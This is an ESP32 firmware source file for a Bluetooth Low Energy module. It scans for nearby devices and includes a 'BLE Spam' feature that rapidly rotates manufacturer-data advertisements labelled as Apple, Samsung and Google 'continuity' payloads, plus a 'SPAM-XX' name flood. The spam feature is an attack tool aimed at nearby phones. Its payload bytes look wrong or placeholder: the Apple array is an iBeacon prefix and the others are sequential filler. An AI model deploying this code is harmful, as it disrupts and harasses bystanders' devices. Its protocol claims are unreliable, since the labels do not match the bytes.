#include "ble_engine.h"
#include "terminal.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertising.h>

static BLEScan* s_scan = nullptr;
static BLEDev   s_devs[48];
static volatile uint16_t s_count = 0;
static volatile bool s_scanning = false, s_spamming = false;
static uint8_t s_spamMode = 0;
static uint32_t s_spamLast = 0;
static uint8_t s_spamIdx = 0;

/* Apple / Samsung / Google "continuity" payloads */
static const uint8_t PKT_APPLE[]  = {0x4C,0x00,0x02,0x15,0xE8,0x5B,0xE0,0x00,
                                     0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                     0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t PKT_SAMSUNG[]= {0x42,0x09,0x0A,0x02,0x01,0x02,0x03,0x04,
                                     0x05,0x06,0x07,0x08,0x09,0x0A};
static const uint8_t PKT_GOOGLE[] = {0x0D,0x0E,0x0F,0x10};

class ScanCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice d) override {
    if (s_count >= 48) return;
    BLEDev& b = s_devs[s_count];
    BLEAddress a = d.getAddress();
    memcpy(b.addr, a.getNative(), 6);
    b.rssi = d.getRSSI();
    strlcpy(b.name, d.haveName() ? d.getName().c_str() : "", sizeof(b.name));
    b.company = d.haveManufacturerData() ? 0xFFFF : 0;
    s_count++;
  }
};

void bleInit() {
  BLEDevice::init("ESP32-Audit");
  s_scan = BLEDevice::getScan();
  s_scan->setAdvertisedDeviceCallbacks(new ScanCB(), false);
  s_scan->setActiveScan(true);
  s_scan->setInterval(100);
  s_scan->setWindow(99);
  termLog(LVL_OK, "BLE stack initialized.");
}

void bleScanStart() {
  if (s_scanning) return;
  bleClear();
  s_scanning = true;
  termLog(LVL_INFO, "Starting BLE scan...");
  s_scan->start(3, false);
  termLog(LVL_OK, "BLE scan complete. Found %u devices.", s_count);
  s_scanning = false;
}

void bleScanStop() { s_scan->stop(); s_scanning = false; }
bool bleScanning() { return s_scanning; }
uint16_t bleCount() { return s_count; }
bool bleGet(uint16_t i, BLEDev* o) { if (i >= s_count) return false; *o = s_devs[i]; return true; }
void bleClear() { s_count = 0; }

void bleSpamStart(uint8_t mode) {
  s_spamming = true;
  s_spamMode = mode;
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->setScanResponse(false);
  adv->setMinPreferred(0x06);
  BLEDevice::startAdvertising();
  termLog(LVL_OK, "BLE Spam started (mode %u)", mode);
}

void bleSpamStop() {
  BLEDevice::stopAdvertising();
  s_spamming = false;
  termLog(LVL_WARN, "BLE Spam stopped.");
}

bool bleSpamming() { return s_spamming; }

void bleTick() {
  if (!s_spamming) return;
  uint32_t now = millis();
  if (now - s_spamLast < 90) return;
  s_spamLast = now;

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->stop();

  BLEAdvertisementData d;
  switch (s_spamMode) {
    case 0:  d.setManufacturerData(std::string((const char*)PKT_APPLE, sizeof(PKT_APPLE)));  break;
    case 1:  d.setManufacturerData(std::string((const char*)PKT_SAMSUNG, sizeof(PKT_SAMSUNG)));break;
    case 2:  d.setManufacturerData(std::string((const char*)PKT_GOOGLE, sizeof(PKT_GOOGLE)));  break;
    default: {
      char nm[24];
      snprintf(nm, sizeof(nm), "SPAM-%02X", s_spamIdx++);
      d.setName(nm);
      break;
    }
  }
  adv->setAdvertisementData(d);
  adv->start();
}